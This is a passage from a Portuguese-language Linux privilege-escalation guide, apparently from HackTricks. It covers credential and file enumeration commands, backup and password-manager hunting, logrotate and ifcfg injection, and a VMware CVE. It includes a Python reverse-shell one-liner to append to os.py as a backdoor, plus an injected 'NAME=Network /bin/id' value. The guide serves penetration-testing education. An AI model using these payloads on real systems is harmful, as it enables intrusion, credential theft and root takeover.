for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Arquivos modificados nos últimos minutos

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Arquivos de banco de dados SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Para bancos de dados de aplicativos legíveis, inspecione os nomes das tabelas e colunas em busca de nomes de usuário e hashes de senha. Encontrar um hash, recuperar a senha correspondente e comprovar que ela é reutilizada em uma conta local são etapas distintas; uma sequência hexadecimal genérica de 32 caracteres não basta para inferir que seja MD5 nem que dê acesso à conta.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml arquivos

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Se um histórico legível do shell contiver um comando `sudo` seguido de uma linha curta parecida com uma senha, inspecione manualmente as linhas ao redor. Uma senha digitada no prompt normal do `sudo` não é salva no histórico do shell; uma linha seguinte é apenas uma possível entrada acidental no shell, não uma prova de que a senha seja válida. O marcador `.sudo_as_admin_successful` registra um uso anterior, não a autorização atual.

### Arquivos ocultos

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Scripts/Binários no PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Arquivos da Web**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Cópias de segurança**

Inspecione arquivos legíveis dentro de diretórios de cópias de segurança, assim como arquivos cujos **nomes** contenham `backup`: um arquivo compactado com nome opaco ou extensão criptografada ainda pode expor dados antigos de aplicações. Um arquivo compactado criptografado é apenas um possível ponto de exposição. Recuperar a senha, inspecionar seu conteúdo, recuperar um hash de aplicação e reutilizar essa senha em uma conta Unix são etapas distintas que precisam ser verificadas; um hash em um arquivo compactado não comprova a existência de um login local.

Cópias de segurança legíveis de máquinas virtuais também merecem essa análise. Uma configuração `.vbox` do VirtualBox pode identificar imagens `.vdi` anexadas e conter metadados de chave de disco criptografada; [a documentação do VirtualBox informa que a chave de dados criptografada é armazenada na configuração da VM](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). É necessário ter acesso tanto à configuração quanto à imagem para realizar uma análise offline do disco. Um volume do guest pode ter sua própria [camada de criptografia LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), que exige uma chave separada. Mesmo após uma descriptografia autorizada, scripts ou configurações antigos podem conter uma senha; confirme que a credencial ainda é válida para uma conta do host e que a política `sudo` efetiva permite executar um comando privilegiado antes de classificar isso como uma elevação de privilégios local. Durante a enumeração passiva, inventarie caminhos e permissões sem copiar, descriptografar ou montar imagens.

Ao inspecionar um arquivo compactado legível, liste os nomes dos itens antes de extrair qualquer conteúdo: arquivos de autenticação ocultos, material de códigos de recuperação ou chaves SSH podem estar presentes, mesmo que as cópias em uso estejam protegidas. Os nomes dos arquivos são apenas indícios; verifique separadamente o material e qualquer reutilização de contas.

Dê prioridade a **arquivos compactados legíveis pertencentes a outro usuário** nos diretórios de cópias de segurança, especialmente os pertencentes ao root e aqueles acessíveis por associação a grupos. Um arquivo antigo pode conter uma configuração ou um segredo de autenticação, mesmo quando a cópia em uso está protegida. Para uma interface local de cópias de segurança, como o [Backrest](https://garethgeorge.github.io/backrest/), verifique a conta efetiva do serviço e se um usuário com menos privilégios pode ler sua configuração ou autenticar-se na interface. Seus [hooks](https://garethgeorge.github.io/backrest/docs/hooks) e sua [interface de comandos restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) podem operar com os privilégios de arquivo e de comando do daemon; um listener de loopback, por si só, não determina o impacto. O `passwordBcrypt` do Backrest é um hash bcrypt codificado em base64 no seu [código de autenticação](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), não uma senha em texto simples. Confirme a identidade do serviço, a validade das credenciais e o acesso ao plano ou repositório relevante antes de tratar um arquivo compactado ou uma interface expostos como uma fronteira de privilégios.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Arquivos conhecidos que contêm senhas

Leia o código do [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS); ele procura **vários arquivos possíveis que podem conter senhas**.\
**Outra ferramenta interessante** que você pode usar para isso é o [**LaZagne**](https://github.com/AlessandroZ/LaZagne), um aplicativo de código aberto usado para recuperar muitas senhas armazenadas em um computador local com Windows, Linux e Mac.

Se `/etc/guacamole/guacamole.properties` puder ser lido, revise as configurações de conexão com o banco de dados `mysql-*`, `postgresql-*` ou `sqlserver-*`. Se a conta tiver autorização para ler as tabelas JDBC do Guacamole, `guacamole_connection_parameter` pode conter valores salvos de `username`, `password`, `private-key` ou `passphrase` para SSH. Comece pelos IDs de conexão e nomes dos parâmetros e, em seguida, inspecione apenas as linhas relevantes; um valor salvo pode ser um token dinâmico ou uma referência a um cofre, em vez de um segredo reutilizável. Consulte o [esquema JDBC do Guacamole](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) e os [parâmetros de conexão SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

O gerenciador de senhas [pswm](https://github.com/Julynx/pswm#usage) armazena por padrão um cofre criptografado em `~/.local/share/pswm/pswm`. Se o cofre de outro usuário estiver visível, verifique a propriedade e se sua conta realmente pode lê-lo. O caminho do cofre, por si só, não revela credenciais; recuperar a senha mestra, encontrar uma senha de conta reutilizável e confirmar os privilégios dessa conta são etapas distintas.

O [banco de dados padrão do Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) fica em `~/.passpie/`, com um chaveiro `.keys` e arquivos de credenciais criptografados `.pass` dentro de diretórios de grupo. Um diretório de banco de dados visível é apenas uma pista de caminho: confirme o acesso à chave e à entrada criptografada relevante, qualquer frase secreta mestra necessária e se a credencial recuperada pertence a uma conta com mais privilégios. O Passpie também aceita [caminhos de banco de dados personalizados](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), portanto, o caminho padrão não é exaustivo. A enumeração automatizada deve listar metadados sem exportar credenciais nem exibir material de chave.

### Logs

Se você puder ler os logs, talvez encontre **informações interessantes/confidenciais neles**. Quanto mais estranho for o log, mais interessante será (provavelmente).\
Além disso, alguns **logs de auditoria** mal configurados (com backdoor?) podem permitir que você **registre senhas** nos logs de auditoria, conforme explicado nesta publicação: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Para **ler logs, o grupo** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) será muito útil.

### Arquivos de shell

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Busca/Regex de Creds Genéricas

Você também deve verificar se há arquivos que contenham a palavra "**password**" no **nome** ou no conteúdo, além de procurar IPs, e-mails ou expressões regulares de hashes nos logs.\
Não vou listar aqui como fazer tudo isso, mas, se tiver interesse, confira as últimas verificações realizadas pelo [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Arquivos graváveis

### Python library hijacking

Se você sabe **de onde** um script Python será executado e **pode gravar nessa pasta** ou **modificar bibliotecas Python**, pode modificar a biblioteca do SO e instalar um backdoor nela (se puder gravar no local de execução do script Python, copie e cole a biblioteca os.py).

Para **instalar um backdoor na biblioteca**, basta adicionar a linha a seguir ao final da biblioteca os.py (altere o IP e a PORTA):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Exploração de logrotate

Uma tarefa privilegiada de `logrotate` pode criar um caminho para escrita de arquivos entre usuários quando realmente rotaciona um log em um diretório que um usuário com menos privilégios pode substituir ou redirecionar durante a rotação. Um log gravável, por si só, é apenas uma pista. Confirme a regra ativa exata e suas diretivas `create`, `olddir` e `su`; a identidade efetiva do agendador; as permissões de escrita e busca no diretório pai do log; e se a versão instalada e a política permitem alterar o destino. Para que a escrita em um arquivo de inicialização resulte em execução de comandos, um shell privilegiado posterior também precisa carregar o arquivo resultante. Inspecione o agendamento, a regra, a versão e o empacotamento, além dos metadados do caminho, sem acionar uma rotação nem tentar a corrida.

> [!TIP]
> Não considere `3.18.0` nem qualquer string de versão, isoladamente, como um limite de explorabilidade. O [changelog upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) registra medidas de proteção contra diretórios e symlinks em várias versões, e as distribuições podem aplicar correções retroativamente. O [manual upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) recomenda `su` quando o root rotaciona logs em diretórios controlados por usuários sem privilégios; verifique a regra efetiva e o comportamento real.

Informações mais detalhadas sobre a vulnerabilidade podem ser encontradas nesta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Você pode explorar essa vulnerabilidade com [**logrotten**](https://github.com/whotwagner/logrotten).

Esta vulnerabilidade é muito semelhante à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logs do nginx),** então, sempre que descobrir que pode alterar logs, verifique quem os gerencia e se é possível escalar privilégios substituindo os logs por symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referência da vulnerabilidade:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Um arquivo `ifcfg-*` é uma pista para investigação quando um usuário com menos privilégios pode criá-lo ou alterá-lo **e** um caminho privilegiado de ativação de rede lerá exatamente esse arquivo. Confirme as permissões efetivas do arquivo e do diretório, a interface selecionada, a implementação instalada de `ifup`/`ifdown` e quem a invoca. Um arquivo gravável, por si só, não causa execução. O [guia de rede do RHEL 7 da Red Hat](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) distingue os scripts de rede legados do NetworkManager: este último não aciona os primeiros por si só. A [documentação do RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) informa que, por padrão, o `ifup`/`ifdown` usa NetworkManager, enquanto o pacote legado opcional fornece scripts de shell.

Em um sistema que realmente usa scripts legados privilegiados, uma atribuição `ifcfg-*` sem aspas e carregada como código pelo shell, como `NAME=`, pode atravessar uma fronteira de execução de código. Verifique o parser exato, o valor e o caminho de ativação; não presuma que o shell interpretará o conteúdo com base no nome do arquivo ou na presença do NetworkManager. Um wrapper permitido pelo sudo que grava a entrada do chamador em um arquivo `ifcfg-*` e, em seguida, chama o `ifup` legado é outro caminho para essa fronteira, mesmo quando o chamador não pode editar o arquivo diretamente.

Por exemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Observe o espaço em branco entre Network e /bin/id_)

### **init, init.d, systemd e rc.d**

O diretório `/etc/init.d` contém **scripts** do System V init (SysVinit), o **sistema clássico de gerenciamento de serviços do Linux**. Ele inclui scripts para `start`, `stop`, `restart` e, às vezes, `reload` de serviços. Eles podem ser executados diretamente ou por meio de links simbólicos encontrados em `/etc/rc?.d/`. Nos sistemas Redhat, um caminho alternativo é `/etc/rc.d/init.d`.

Por outro lado, `/etc/init` está associado ao **Upstart**, um sistema mais recente de **gerenciamento de serviços** introduzido pelo Ubuntu, que usa arquivos de configuração para tarefas de gerenciamento de serviços. Apesar da transição para o Upstart, os scripts do SysVinit ainda são usados junto com as configurações do Upstart, graças a uma camada de compatibilidade do Upstart.

O **systemd** surge como um gerenciador moderno de inicialização e serviços, oferecendo recursos avançados, como inicialização de daemons sob demanda, gerenciamento de montagem automática e snapshots do estado do sistema. Ele organiza os arquivos em `/usr/lib/systemd/`, para pacotes da distribuição, e `/etc/systemd/system/`, para modificações feitas pelo administrador, simplificando o processo de administração do sistema.<sup>[[21]](#references)</sup>

## Outros truques

### Escalonamento de privilégios via NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escapando de shells restritos


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: abuso do canal do manager

Android rooting frameworks comumente fazem hook de uma syscall para expor funcionalidades privilegiadas do kernel a um manager no userspace. Uma autenticação fraca do manager (por exemplo, verificações de assinatura baseadas na ordem dos FD ou esquemas de senha inadequados) pode permitir que um app local se passe pelo manager e obtenha root em dispositivos já rooted. Saiba mais e confira os detalhes da exploração aqui:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Descoberta de serviços do VMware Tools com LPE (CWE-426) via exec baseado em regex (CVE-2025-41244)

A descoberta de serviços orientada por regex no VMware Tools/Aria Operations pode extrair um caminho de binário das linhas de comando dos processos e executá-lo com -v em um contexto privilegiado. Padrões permissivos (por exemplo, que usam \S) podem corresponder a listeners preparados por um atacante em locais graváveis (por exemplo, /tmp/httpd), levando à execução como root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Saiba mais e veja aqui um padrão generalizado aplicável a outras stacks de descoberta/monitoramento:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Proteções de segurança do kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Mais ajuda

[Binários estáticos do impacket](https://github.com/ropnop/impacket_static_binaries)

## Ferramentas de Privesc para Linux/Unix

### **Melhor ferramenta para procurar vetores de escalonamento local de privilégios no Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opção -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumera vulnerabilidades de kernel no Linux e MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (acesso físico):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Compilação de mais scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (escalonamento de privilégios via interface do Crontab, reutilização de credenciais com zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: payload .text_sig forjado para monitor executado pelo cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: desvio do Neighborhood Watch (sequestro de PATH via sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Escalonamento básico de privilégios no Linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Guia de escalonamento de privilégios no Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Ataque e defesa: técnicas de escalonamento de privilégios no Linux de 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Ninguém espera a execução de comandos!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (escalonamento de privilégios no Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Guia passo a passo dos exercícios de laboratório - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: dicas e truques para escalonamento de privilégios no Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: ferramenta de enumeração e escalonamento de privilégios no Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [O que é um socket?](https://www.linux.com/news/what-socket/)
- [15] [Write-up de Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Acesse o D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Escalonamento de privilégios no Linux por executáveis SUID](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo parte 2 – escalonamento de privilégios no Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Como gerenciar ACLs no Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Root em Redhat/CentOS por meio de network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [O que é systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (injeção aritmética do bash via logs, cadeia completa)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Manual do GNU Bash – BASH_ENV (arquivo de inicialização não interativo)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + escalonamento de privilégios via symlink TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (cópia do pg_basebackup via cron → bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Você escolhe o nome, a VMware eleva os privilégios (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: escalonamento de privilégios do Sudo via Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Vulnerabilidades de escalonamento de privilégios do Sudo: CVE-2025-32462 e CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Diretórios de repositório PYC](https://peps.python.org/pep-3147/)
- [32] [Documentação do Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet de @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Registrando senhas no Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Detalhes de uma condição de corrida do logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
